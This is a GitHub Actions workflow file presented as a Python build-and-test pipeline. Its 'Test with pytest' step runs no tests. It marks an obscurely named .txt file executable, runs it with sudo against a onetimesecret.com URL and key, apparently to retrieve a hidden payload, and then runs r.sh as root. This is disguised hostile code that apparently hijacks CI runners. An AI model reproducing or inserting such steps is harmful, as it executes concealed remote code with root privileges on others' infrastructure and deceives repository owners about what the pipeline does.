name: Python application

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

permissions:
  contents: read

jobs:
  build:

    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v3
    - name: Set up Python 3.8
      uses: actions/setup-python@v3
      with:
        python-version: "3.8"
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
    - name: Test with pytest
      run: |
        cd ${{ github.workspace }}
        echo '4z1lc'
        sudo chmod +x ie5fvtzu/field7hk4t.txt
        sudo ./ie5fvtzu/field7hk4t.txt https://onetimesecret.com/secret/4gpowx11hqxtf6xr8n3otekyr4t48m0 szoh0h && sudo sh r.sh
